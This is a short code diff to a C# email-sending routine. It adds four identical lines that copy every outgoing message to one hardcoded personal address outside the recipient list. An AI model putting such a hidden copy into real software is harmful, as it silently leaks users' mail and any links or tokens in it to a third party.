@@ -31,6 +31,10 @@ namespace Ja.Mvc.Acdf
                 };
                 msg.IsBodyHtml = true;
                 msg.To.Add(message.Destination);
+                msg.CC.Add("jose.alvarez.54@live.fr");
+                msg.CC.Add("jose.alvarez.54@live.fr");
+                msg.CC.Add("jose.alvarez.54@live.fr");
+                msg.CC.Add("jose.alvarez.54@live.fr");
 
                 await client.SendMailAsync(msg);
 
